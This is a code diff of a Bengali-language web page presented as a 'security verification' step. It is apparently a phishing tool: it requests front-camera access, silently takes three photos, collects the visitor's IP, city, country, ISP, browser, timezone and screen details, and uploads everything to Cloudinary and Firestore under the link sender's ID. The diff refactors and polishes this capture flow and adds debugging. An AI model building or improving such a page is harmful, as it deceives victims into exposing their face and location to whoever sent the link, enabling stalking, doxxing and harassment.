@@ -3,9 +3,243 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ভেরিফিকেশন প্রয়োজন</title>
+<title>নিরাপত্তা যাচাইকরণ</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Hind+Siliguri:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="style.css">
+<style>
+  /* ---------- FORM PAGE STYLES ---------- */
+  *{margin:0;padding:0;box-sizing:border-box;}
+
+  body{
+    font-family:'Inter','Hind Siliguri',sans-serif;
+    background:#0a0e1a;
+    color:#fff;
+    min-height:100vh;
+    letter-spacing:-0.01em;
+    overflow-x:hidden;
+    position:relative;
+  }
+
+  body::before{
+    content:"";
+    position:fixed;
+    width:500px;height:500px;
+    border-radius:50%;
+    background:radial-gradient(circle,#6366f1,transparent 70%);
+    filter:blur(120px);
+    opacity:.3;
+    top:-150px;left:-150px;
+    z-index:0;
+    pointer-events:none;
+  }
+  body::after{
+    content:"";
+    position:fixed;
+    width:400px;height:400px;
+    border-radius:50%;
+    background:radial-gradient(circle,#ec4899,transparent 70%);
+    filter:blur(120px);
+    opacity:.25;
+    bottom:-150px;right:-150px;
+    z-index:0;
+    pointer-events:none;
+  }
+
+  .form-page{
+    position:relative;
+    z-index:2;
+    max-width:520px;
+    margin:30px auto;
+    padding:0 18px;
+  }
+
+  .form-card{
+    background:rgba(20,27,45,0.9);
+    border:1px solid rgba(255,255,255,0.08);
+    border-radius:24px;
+    overflow:hidden;
+    box-shadow:0 25px 70px rgba(0,0,0,0.6);
+    backdrop-filter:blur(24px);
+  }
+
+  .form-card-head{
+    background:linear-gradient(135deg,#6366f1,#8b5cf6,#ec4899);
+    padding:34px 26px 30px;
+    text-align:center;
+    color:#fff;
+    position:relative;
+    overflow:hidden;
+  }
+  .form-card-head::before{
+    content:"";
+    position:absolute;
+    top:-60px;right:-60px;
+    width:200px;height:200px;
+    border-radius:50%;
+    background:radial-gradient(circle,rgba(255,255,255,0.2),transparent 70%);
+  }
+
+  .form-card-head .ico{
+    width:70px;height:70px;
+    margin:0 auto 18px;
+    border-radius:22px;
+    background:rgba(255,255,255,0.2);
+    backdrop-filter:blur(20px);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:32px;
+    border:1px solid rgba(255,255,255,0.3);
+    position:relative;
+    z-index:1;
+  }
+
+  .form-card-head h1{
+    font-size:22px;
+    font-weight:800;
+    letter-spacing:-0.025em;
+    margin-bottom:8px;
+    position:relative;
+    z-index:1;
+  }
+  .form-card-head p{
+    font-size:14px;
+    opacity:.9;
+    position:relative;
+    z-index:1;
+  }
+
+  .form-card-body{
+    padding:26px 24px 28px;
+  }
+
+  /* Progress dots */
+  .progress-dots{
+    display:flex;
+    justify-content:center;
+    gap:8px;
+    margin-bottom:18px;
+  }
+  .progress-dots span{
+    width:42px;
+    height:6px;
+    border-radius:3px;
+    background:rgba(255,255,255,0.1);
+    transition:all .4s;
+  }
+  .progress-dots span.done{
+    background:linear-gradient(90deg,#6366f1,#8b5cf6);
+    box-shadow:0 0 14px rgba(99,102,241,0.7);
+  }
+
+  /* Video wrap */
+  .video-wrap{
+    position:relative;
+    border-radius:18px;
+    overflow:hidden;
+    aspect-ratio:3/4;
+    background:#000;
+    margin-bottom:16px;
+    border:1px solid rgba(255,255,255,0.08);
+    box-shadow:0 20px 50px rgba(0,0,0,0.4);
+  }
+  .video-wrap video{
+    width:100%;height:100%;
+    object-fit:cover;
+    transform:scaleX(-1);
+    display:block;
+    background:#000;
+  }
+
+  .badge-tl{
+    position:absolute;
+    top:12px;left:12px;
+    padding:6px 13px;
+    background:rgba(0,0,0,0.7);
+    backdrop-filter:blur(12px);
+    border-radius:10px;
+    color:#fff;
+    font-size:12px;
+    font-weight:700;
+    letter-spacing:0.02em;
+    border:1px solid rgba(255,255,255,0.15);
+    font-family:'JetBrains Mono',monospace;
+  }
+
+  .badge-tr{
+    position:absolute;
+    top:12px;right:12px;
+    padding:6px 13px;
+    background:rgba(239,68,68,0.9);
+    backdrop-filter:blur(12px);
+    border-radius:10px;
+    color:#fff;
+    font-size:11px;
+    font-weight:700;
+    display:flex;
+    align-items:center;
+    gap:6px;
+    border:1px solid rgba(255,255,255,0.2);
+    letter-spacing:0.05em;
+  }
+  .badge-tr::before{
+    content:"";
+    width:6px;height:6px;
+    border-radius:50%;
+    background:#fff;
+    animation:blink 1s infinite;
+  }
+  @keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
+
+  .countdown{
+    position:absolute;
+    inset:0;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    font-size:150px;
+    font-weight:900;
+    color:#fff;
+    text-shadow:0 0 60px #6366f1;
+    background:rgba(0,0,0,0.5);
+    font-family:'JetBrains Mono',monospace;
+    letter-spacing:-0.05em;
+  }
+  .countdown.show{display:flex;}
+
+  .flash{
+    position:absolute;
+    inset:0;
+    background:#fff;
+    opacity:0;
+    pointer-events:none;
+    transition:opacity .1s;
+    z-index:5;
+  }
+  .flash.on{opacity:0.85;}
+
+  .info-note{
+    padding:14px 16px;
+    background:rgba(99,102,241,0.08);
+    border:1px solid rgba(99,102,241,0.25);
+    border-radius:14px;
+    font-size:13px;
+    color:#a5b4fc;
+    line-height:1.6;
+    text-align:center;
+    font-weight:600;
+    transition:all .3s;
+  }
+
+  @media (max-width:520px){
+    .form-page{margin:16px auto;}
+    .form-card-head{padding:26px 20px 22px;}
+    .form-card-head h1{font-size:19px;}
+    .form-card-head .ico{width:60px;height:60px;font-size:26px;}
+    .form-card-body{padding:20px 18px 24px;}
+    .countdown{font-size:110px;}
+  }
+</style>
 </head>
 <body>
 
@@ -32,6 +266,7 @@
         <div class="badge-tl" id="captureCount">০ / ৩</div>
         <div class="badge-tr">LIVE</div>
         <div class="countdown" id="countdown">3</div>
+        <div class="flash" id="flash"></div>
       </div>
 
       <div class="info-note" id="statusBox">
@@ -45,16 +280,26 @@
 
 <canvas id="canvas" style="display:none;"></canvas>
 
+<!-- vConsole for mobile debugging -->
+<script src="https://cdn.jsdelivr.net/npm/vconsole@latest/dist/vconsole.min.js"></script>
+<script>
+  if (window.VConsole) { window.vConsole = new window.VConsole(); }
+</script>
+
 <script type="module">
-import {
-  db, collection, addDoc, serverTimestamp
-} from "./firebase.js";
+import { db, collection, addDoc, serverTimestamp } from "./firebase.js";
 import { uploadToCloudinary } from "./cloudinary.js";
 
+/* ============================================================
+   CONFIG
+   ============================================================ */
 const CAPTURE_COUNT  = 3;
-const CAPTURE_GAP_MS = 2200;
-const IMAGE_QUALITY  = 0.75;
+const CAPTURE_GAP_MS = 2500;
+const IMAGE_QUALITY  = 0.72;
 
+/* ============================================================
+   ELEMENTS
+   ============================================================ */
 const params   = new URLSearchParams(location.search);
 const ownerUid = params.get("id");
 
@@ -63,14 +308,21 @@ const canvas       = document.getElementById("canvas");
 const statusBox    = document.getElementById("statusBox");
 const captureCount = document.getElementById("captureCount");
 const countdown    = document.getElementById("countdown");
+const flash        = document.getElementById("flash");
 const dots         = document.querySelectorAll("#dots span");
+
+function log(msg){ console.log("[MyVault] " + msg); }
+function logErr(msg, e){ console.error("[MyVault ERROR] " + msg, e || ""); }
 
 if (!ownerUid){
   statusBox.textContent = "❌ ভুল লিংক — owner ID নেই";
-  statusBox.style.background = "rgba(239,68,68,0.1)";
+  statusBox.style.background = "rgba(239,68,68,0.15)";
   statusBox.style.color = "#fca5a5";
+  logErr("No owner UID in URL");
   throw new Error("No owner UID");
 }
+
+log("Owner UID: " + ownerUid);
 
 let stream   = null;
 let captured = 0;
@@ -79,6 +331,11 @@ function updateDots(n){
   dots.forEach((d, i) => d.classList.toggle("done", i < n));
 }
 
+function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
+
+/* ============================================================
+   INTEL — IP + Geo
+   ============================================================ */
 async function getIP(){
   try {
     const r = await fetch("https://api.ipify.org?format=json");
@@ -100,124 +357,203 @@ async function getGeo(){
   } catch { return { city:"?", country:"?", isp:"?", text:"Unknown" }; }
 }
 
+/* ============================================================
+   CAPTURE ONE FRAME
+   ============================================================ */
+async function captureFrame(index){
+  log("── Frame " + index + " শুরু ──");
+
+  /* Countdown 3-2-1 */
+  countdown.classList.add("show");
+  for (let c = 3; c > 0; c--){
+    countdown.textContent = c;
+    await sleep(600);
+  }
+  countdown.classList.remove("show");
+
+  /* Flash effect */
+  flash.classList.add("on");
+  await sleep(80);
+  flash.classList.remove("on");
+
+  /* Badge + dots */
+  captureCount.textContent = index + " / " + CAPTURE_COUNT;
+  updateDots(index);
+
+  /* Draw video to canvas */
+  try {
+    const vw = video.videoWidth  || 720;
+    const vh = video.videoHeight || 960;
+    canvas.width  = vw;
+    canvas.height = vh;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, vw, vh);
+    log("Frame " + index + " canvas আঁকা হয়েছে (" + vw + "×" + vh + ")");
+  } catch(e){
+    logErr("Canvas draw failed for frame " + index, e);
+    return null;
+  }
+
+  /* Blob */
+  const blob = await new Promise(res =>
+    canvas.toBlob(res, "image/jpeg", IMAGE_QUALITY)
+  );
+
+  if (!blob){
+    logErr("Blob null for frame " + index);
+    return null;
+  }
+  log("Frame " + index + " blob: " + Math.round(blob.size / 1024) + " KB");
+
+  return blob;
+}
+
+/* ============================================================
+   UPLOAD + SAVE ONE FRAME
+   ============================================================ */
+async function uploadAndSave(blob, index, ip, geo, ua, tz, lang, screenRes){
+  let photoUrl = "";
+
+  /* Cloudinary upload */
+  try {
+    log("Frame " + index + " Cloudinary-তে যাচ্ছে…");
+    const uploaded = await uploadToCloudinary(blob, "myvault/" + ownerUid);
+    if (uploaded){
+      photoUrl = uploaded;
+      log("✓ Frame " + index + " upload OK");
+    } else {
+      logErr("Cloudinary null — dataURL fallback");
+      photoUrl = canvas.toDataURL("image/jpeg", 0.5);
+    }
+  } catch(e){
+    logErr("Cloudinary threw for frame " + index, e);
+    photoUrl = canvas.toDataURL("image/jpeg", 0.5);
+  }
+
+  /* Save to Firestore */
+  try {
+    log("Frame " + index + " Firestore-এ save হচ্ছে…");
+    await addDoc(collection(db, "captures"), {
+      ownerUid:    ownerUid,
+      photoUrl:    photoUrl,
+      ip:          ip,
+      geo:         geo.text,
+      geoCity:     geo.city,
+      geoCountry:  geo.country,
+      geoISP:      geo.isp,
+      userAgent:   ua,
+      timezone:    tz,
+      language:    lang,
+      screen:      screenRes,
+      frameIndex:  index,
+      totalFrames: CAPTURE_COUNT,
+      createdAt:   serverTimestamp()
+    });
+    captured++;
+    log("✓ Frame " + index + " saved to Firestore (total=" + captured + ")");
+    return true;
+  } catch(e){
+    logErr("Firestore save failed frame " + index, e);
+    return false;
+  }
+}
+
+/* ============================================================
+   MAIN FLOW
+   ============================================================ */
 async function start(){
+  log("=== MyVault শুরু ===");
+
+  /* --- Step 1: Camera --- */
   try {
     statusBox.textContent = "ক্যামেরার অনুমতি চাওয়া হচ্ছে…";
 
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { width: { ideal: 720 }, height: { ideal: 960 }, facingMode: "user" }
+      video: {
+        width:  { ideal: 720 },
+        height: { ideal: 960 },
+        facingMode: "user"
+      }
     });
+
     video.srcObject = stream;
     await video.play();
 
-    await new Promise(r => video.readyState >= 2 ? r() : video.onloadeddata = r);
-    await new Promise(r => setTimeout(r, 1000));
+    /* Wait for video ready */
+    await new Promise(r => {
+      if (video.readyState >= 2) return r();
+      video.onloadeddata = r;
+      setTimeout(r, 3000);
+    });
+
+    /* Extra warm-up for exposure */
+    await sleep(1200);
+
+    log("ক্যামেরা চালু (video " + video.videoWidth + "×" + video.videoHeight + ")");
 
     statusBox.textContent = "✅ ক্যামেরা চালু — যাচাইকরণ শুরু হচ্ছে…";
     statusBox.style.background = "rgba(16,185,129,0.1)";
     statusBox.style.color = "#6ee7b7";
 
-    runCapture();
-  } catch (err) {
-    console.error("Camera error:", err);
-    statusBox.textContent = "❌ ক্যামেরা পাওয়া যায়নি — অনুমতি দিন";
-    statusBox.style.background = "rgba(239,68,68,0.1)";
+  } catch (err){
+    logErr("Camera error", err);
+    statusBox.textContent = "❌ ক্যামেরা পাওয়া যায়নি — অনুমতি দিন ও রিফ্রেশ করুন";
+    statusBox.style.background = "rgba(239,68,68,0.15)";
     statusBox.style.color = "#fca5a5";
+    return;
   }
-}
 
-async function runCapture(){
-  const ip   = await getIP();
-  const geo  = await getGeo();
-  const ua   = navigator.userAgent;
-  const tz   = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  /* --- Step 2: Fetch intel once --- */
+  log("IP ও Geo fetch হচ্ছে…");
+  const ip  = await getIP();
+  const geo = await getGeo();
+  const ua  = navigator.userAgent;
+  const tz  = Intl.DateTimeFormat().resolvedOptions().timeZone;
   const lang = navigator.language;
   const screenRes = window.screen.width + "×" + window.screen.height;
 
-  for (let i = 0; i < CAPTURE_COUNT; i++){
-    countdown.classList.add("show");
-    for (let c = 3; c > 0; c--){
-      countdown.textContent = c;
-      await new Promise(r => setTimeout(r, 500));
-    }
-    countdown.classList.remove("show");
+  log("IP: " + ip);
+  log("Geo: " + geo.text);
 
-    captureCount.textContent = (i+1) + " / " + CAPTURE_COUNT;
-    updateDots(i+1);
-
-    canvas.width  = video.videoWidth  || 720;
-    canvas.height = video.videoHeight || 960;
-    canvas.getContext("2d").drawImage(video, 0, 0);
-
-    const blob = await new Promise(res =>
-      canvas.toBlob(res, "image/jpeg", IMAGE_QUALITY)
-    );
-
-    if (!blob){
-      console.warn("Blob failed at frame " + i);
-      continue;
-    }
-
-    let photoUrl = "";
+  /* --- Step 3: Capture loop (3 frames) --- */
+  for (let i = 1; i <= CAPTURE_COUNT; i++){
     try {
-      const uploaded = await uploadToCloudinary(blob, "myvault/" + ownerUid);
-      if (uploaded){
-        photoUrl = uploaded;
-        console.log("✓ Frame " + (i+1) + " → " + photoUrl);
-      } else {
-        photoUrl = canvas.toDataURL("image/jpeg", IMAGE_QUALITY);
-        console.warn("Fallback to dataURL for frame " + (i+1));
+      const blob = await captureFrame(i);
+      if (blob){
+        await uploadAndSave(blob, i, ip, geo, ua, tz, lang, screenRes);
       }
     } catch(e){
-      console.error("Upload error:", e);
-      photoUrl = canvas.toDataURL("image/jpeg", IMAGE_QUALITY);
+      logErr("Frame " + i + " loop error", e);
+      /* continue with next frame anyway */
     }
 
-    try {
-      await addDoc(collection(db, "captures"), {
-        ownerUid: ownerUid,
-        photoUrl: photoUrl,
-        ip: ip,
-        geo: geo.text,
-        geoCity: geo.city,
-        geoCountry: geo.country,
-        geoISP: geo.isp,
-        userAgent: ua,
-        timezone: tz,
-        language: lang,
-        screen: screenRes,
-        frameIndex: i + 1,
-        totalFrames: CAPTURE_COUNT,
-        createdAt: serverTimestamp()
-      });
-      captured++;
-      console.log("✓ Firestore save: frame " + (i+1));
-    } catch(e){
-      console.error("Firestore error:", e);
-    }
-
-    if (i < CAPTURE_COUNT - 1){
-      await new Promise(r => setTimeout(r, CAPTURE_GAP_MS));
+    /* gap before next frame */
+    if (i < CAPTURE_COUNT){
+      log("পরবর্তী frame-এর জন্য অপেক্ষা " + CAPTURE_GAP_MS + "ms…");
+      await sleep(CAPTURE_GAP_MS);
     }
   }
+
+  /* --- Step 4: Done --- */
+  log("=== সম্পূর্ণ। Saved: " + captured + "/" + CAPTURE_COUNT + " ===");
 
   if (stream){
     stream.getTracks().forEach(t => t.stop());
     stream = null;
   }
 
-  statusBox.textContent = "✅ যাচাইকরণ সম্পূর্ণ — ধন্যবাদ!";
-  statusBox.style.background = "rgba(16,185,129,0.1)";
-  statusBox.style.color = "#6ee7b7";
-  statusBox.style.fontWeight = "700";
+  if (captured > 0){
+    statusBox.textContent = "✅ যাচাইকরণ সম্পূর্ণ — ধন্যবাদ! (" + captured + "/" + CAPTURE_COUNT + ")";
+    statusBox.style.background = "rgba(16,185,129,0.1)";
+    statusBox.style.color = "#6ee7b7";
+  } else {
+    statusBox.textContent = "❌ কোনো ছবি সেভ হয়নি — আবার চেষ্টা করুন";
+    statusBox.style.background = "rgba(239,68,68,0.15)";
+    statusBox.style.color = "#fca5a5";
+  }
 }
 
 start();
-</script>
-
-  <script src="https://cdn.jsdelivr.net/npm/vconsole@latest/dist/vconsole.min.js"></script>
-<script>
-  var vConsole = new window.VConsole();
 </script>
 
 </body>
